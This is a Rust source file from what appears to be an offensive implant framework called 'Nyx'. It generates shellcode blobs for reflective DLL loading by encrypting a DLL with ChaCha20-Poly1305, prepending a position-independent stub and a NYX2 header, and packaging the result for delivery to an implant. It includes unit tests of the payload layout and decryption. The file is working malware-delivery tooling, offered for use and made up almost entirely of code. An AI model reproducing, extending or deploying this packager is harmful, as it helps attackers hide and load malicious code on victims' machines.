//! Nyx PIC reflective loader stub generator.
//!
//! This is a **host-side** library (std, build host) that generates the
//! shellcode blob for reflective DLL loading. It does NOT run on the implant —
//! it produces the PIC stub + encrypted DLL payload that the implant receives
//! and executes.
//!
//! ## Architecture
//!
//! ```text
//! build host                           target (implant)
//! ──────────                           ────────────────
//! dll_bytes ──► wrap_payload() ──► blob ──► implant receives blob
//!                 │                              │
//!                 ├─ encrypt DLL (ChaCha20-Poly1305)      │
//!                 ├─ prepend PIC_STUB                     ▼
//!                 └─ append NYX2 header             execute stub
//!                                                         │
//!                                                         ▼
//!                                                    stub self-locates
//!                                                    finds NYX2 magic
//!                                                    reads len + nonce
//!                                                    decrypt + reflective load
//!                                                    (on-target shellcode;
//!                                                   see stub::reflective_load
//!                                                   for the host-side reference)
//! ```
//!
//! ## Payload layout
//!
//! ```text
//! ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
//! │  PIC_STUB    │  NYX2 magic  │ encrypted_len│    nonce     │  ciphertext  │
//! │  (50 bytes)  │   (4 bytes)  │  u32 LE (4B) │   (12 bytes) │  (N bytes)   │
//! └──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
//!                                                              │
//!                                                ┌──────────────┴──────────────┐
//!                                                │  Poly1305 tag (16 bytes)    │
//!                                                └─────────────────────────────┘
//! ```
//!
//! Total payload size: 50 + 4 + 4 + 12 + N + 16 = 86 + N bytes
//! where N = `dll_bytes.len()` (ChaCha20-Poly1305 ciphertext is same length
//! as plaintext).

pub mod stub;

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Nonce,
};
use rand::RngCore;
use stub::{NYX2_MAGIC, PIC_STUB};

// Re-export key constants for callers that need to reason about offsets.
pub use stub::{
    reflective_load, reflective_load_at, ImportResolver, MappedImage, ReflectiveLoadError,
    CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, PIC_STUB_LEN, TAG_LEN,
};

// ── LoaderConfig ────────────────────────────────────────────────────────

/// Configuration for generating a reflective loader payload.
///
/// Holds the encryption key (32 bytes) and nonce (12 bytes) used to protect
/// the embedded DLL. If you call [`LoaderConfig::random`], both are filled
/// from the OS CSPRNG — the caller is responsible for exfiltrating them (e.g.
/// baking them into a per-implant config so the PIC stub can decrypt).
#[derive(Clone, Debug)]
pub struct LoaderConfig {
    /// ChaCha20-Poly1305 encryption key (32 bytes).
    pub key: [u8; 32],
    /// ChaCha20-Poly1305 nonce (12 bytes).
    pub nonce: [u8; 12],
}

impl LoaderConfig {
    /// Create a `LoaderConfig` with the given key and nonce.
    pub fn new(key: [u8; 32], nonce: [u8; 12]) -> Self {
        Self { key, nonce }
    }

    /// Generate a random key + nonce from the OS CSPRNG.
    ///
    /// The caller MUST persist these values somewhere the PIC stub can access
    /// (e.g. baked into per-implant config), otherwise the implant will be
    /// unable to decrypt the embedded DLL.
    pub fn random() -> Self {
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rngs::OsRng.fill_bytes(&mut key);
        rand::rngs::OsRng.fill_bytes(&mut nonce);
        Self { key, nonce }
    }
}

// ── Public API ──────────────────────────────────────────────────────────

/// Return the raw PIC stub shellcode bytes.
///
/// This is the position-independent x86-64 code that self-locates, finds the
/// NYX2 header, and parses the encrypted-payload header. The trailing reserved
/// bytes are patched into a decrypt + reflective-load trampoline by the
/// on-target build (implant-win toolchain); on the dev host the stub returns
/// immediately so the generated blob is inert when inspected.
///
/// The host-side reference implementation of the reflective loading algorithm
/// (section mapping, base relocation, import resolution) lives in
/// [`stub::reflective_load`].
///
/// The returned slice is a `'static` reference to a compile-time constant;
/// callers that need an owned buffer can use `to_vec()`.
pub fn generate_loader_stub(_config: &LoaderConfig) -> Vec<u8> {
    // The stub is a fixed template. The config (key, nonce) is carried in the
    // NYX2 header that wrap_payload appends (not patched into the stub), so
    // there is nothing to specialise here at present.
    PIC_STUB.to_vec()
}

/// Encrypt a DLL, prepend the loader stub, and assemble the full NYX2 payload.
///
/// # Layout
///
/// ```text
/// [PIC_STUB (50B)][NYX2 magic (4B)][encrypted_len u32 LE (4B)][nonce (12B)]
/// [ciphertext (dll_bytes.len() bytes)][Poly1305 tag (16B)]
/// ```
///
/// # Arguments
///
/// * `dll_bytes` — the raw PE DLL to encrypt and wrap.
/// * `config` — the key and nonce for ChaCha20-Poly1305 encryption.
///
/// # Returns
///
/// A `Vec<u8>` containing the complete payload blob, ready to be delivered
/// to the implant as shellcode.
pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Vec<u8> {
    // 1. Encrypt the DLL with ChaCha20-Poly1305.
    let cipher = ChaCha20Poly1305::new_from_slice(&config.key)
        .expect("ChaCha20Poly1305 key is always 32 bytes");
    let nonce = Nonce::from_slice(&config.nonce);
    let ciphertext = cipher
        .encrypt(nonce, dll_bytes)
        .expect("ChaCha20Poly1305 encrypt is infallible");

    // ciphertext = plaintext || 16-byte Poly1305 tag
    // encrypted_len = dll_bytes.len() (ciphertext portion, excluding tag)
    let encrypted_len = dll_bytes.len() as u32;

    // 2. Assemble: stub + NYX2 header + ciphertext (includes tag)
    let mut payload = Vec::with_capacity(PIC_STUB.len() + 4 + 4 + 12 + ciphertext.len());

    // Stub
    payload.extend_from_slice(PIC_STUB);

    // NYX2 magic (4 bytes, little-endian)
    payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());

    // encrypted_len (4 bytes, little-endian)
    payload.extend_from_slice(&encrypted_len.to_le_bytes());

    // nonce (12 bytes)
    payload.extend_from_slice(&config.nonce);

    // ciphertext || Poly1305 tag
    payload.extend_from_slice(&ciphertext);

    payload
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid PE DLL header for testing (the stub doesn't parse it
    /// yet, but `wrap_payload` encrypts arbitrary bytes).
    fn dummy_dll() -> Vec<u8> {
        // Minimal PE: MZ header + PE signature + empty sections.
        // Just enough bytes to exercise the encrypt/wrap path.
        let mut dll = Vec::new();
        // MZ magic
        dll.extend_from_slice(b"MZ");
        // Padding to make a non-trivial test payload
        dll.extend_from_slice(&[0u8; 62]);
        // PE signature at offset 0x40
        dll.extend_from_slice(b"PE\0\0");
        // Padding
        dll.extend_from_slice(&[0u8; 128]);
        dll
    }

    #[test]
    fn generate_stub_returns_pic_stub() {
        let config = LoaderConfig::random();
        let stub = generate_loader_stub(&config);
        assert_eq!(stub, PIC_STUB);
        assert_eq!(stub.len(), 50);
    }

    #[test]
    fn wrap_payload_layout() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        // 50 (stub) + 4 (magic) + 4 (enc_len) + 12 (nonce) + dll.len() + 16 (tag)
        let expected_len = 50 + 4 + 4 + 12 + dll.len() + 16;
        assert_eq!(payload.len(), expected_len);

        // Check stub bytes at start
        assert_eq!(&payload[0..50], PIC_STUB);

        // Check NYX2 magic at offset 50
        let magic = u32::from_le_bytes(payload[50..54].try_into().unwrap());
        assert_eq!(magic, NYX2_MAGIC);

        // Check encrypted_len at offset 54
        let enc_len = u32::from_le_bytes(payload[54..58].try_into().unwrap());
        assert_eq!(enc_len, dll.len() as u32);

        // Check nonce at offset 58
        assert_eq!(&payload[58..70], &config.nonce);

        // Ciphertext starts at offset 70
        // Its length should be dll.len() + 16 (tag)
        assert_eq!(payload[70..].len(), dll.len() + 16);
    }

    #[test]
    fn wrap_payload_encrypts_dll() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        // The ciphertext (offset 70) should NOT equal the plaintext DLL.
        let ciphertext_with_tag = &payload[70..];
        assert_ne!(
            &ciphertext_with_tag[..dll.len()],
            dll.as_slice(),
            "ciphertext must differ from plaintext"
        );
    }

    #[test]
    fn roundtrip_decrypt() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        // Manually decrypt using the same key/nonce to verify roundtrip.
        let cipher = ChaCha20Poly1305::new_from_slice(&config.key).unwrap();
        let nonce = Nonce::from_slice(&config.nonce);

        // Read encrypted_len from the payload header
        let enc_len = u32::from_le_bytes(payload[54..58].try_into().unwrap()) as usize;

        // ciphertext + tag starts at offset 70
        let ct_with_tag = &payload[70..70 + enc_len + 16];
        let decrypted = cipher
            .decrypt(nonce, ct_with_tag)
            .expect("decrypt should succeed with correct key/nonce");

        assert_eq!(decrypted, dll);
    }

    #[test]
    fn wrap_payload_deterministic() {
        // Same key, nonce, and DLL → same payload
        let key = [0xAAu8; 32];
        let nonce = [0xBBu8; 12];
        let config = LoaderConfig::new(key, nonce);
        let dll = dummy_dll();

        let p1 = wrap_payload(&dll, &config);
        let p2 = wrap_payload(&dll, &config);
        assert_eq!(p1, p2);
    }

    #[test]
    fn wrap_payload_different_nonce_different_ciphertext() {
        let key = [0xCCu8; 32];
        let config1 = LoaderConfig::new(key, [0x11u8; 12]);
        let config2 = LoaderConfig::new(key, [0x22u8; 12]);
        let dll = dummy_dll();

        let p1 = wrap_payload(&dll, &config1);
        let p2 = wrap_payload(&dll, &config2);

        // Ciphertext portions should differ (nonce is different)
        assert_ne!(&p1[70..], &p2[70..]);

        // But headers before ciphertext should match (except nonce field)
        assert_eq!(&p1[..50], &p2[..50]); // stub
        assert_eq!(&p1[50..54], &p2[50..54]); // magic
        assert_eq!(&p1[54..58], &p2[54..58]); // encrypted_len
        assert_ne!(&p1[58..70], &p2[58..70]); // nonce differs
    }

    #[test]
    fn random_config_produces_different_keys() {
        let c1 = LoaderConfig::random();
        let c2 = LoaderConfig::random();
        // Probability of collision is astronomically low
        assert_ne!(c1.key, c2.key);
    }

    #[test]
    fn empty_dll() {
        let config = LoaderConfig::random();
        let dll: Vec<u8> = vec![];
        let payload = wrap_payload(&dll, &config);

        // 50 (stub) + 4 + 4 + 12 + 0 + 16 = 86
        assert_eq!(payload.len(), 86);

        // encrypted_len should be 0
        let enc_len = u32::from_le_bytes(payload[54..58].try_into().unwrap());
        assert_eq!(enc_len, 0);

        // Decrypt should recover empty DLL
        let cipher = ChaCha20Poly1305::new_from_slice(&config.key).unwrap();
        let nonce = Nonce::from_slice(&config.nonce);
        let decrypted = cipher.decrypt(nonce, &payload[70..]).unwrap();
        assert!(decrypted.is_empty());
    }
}
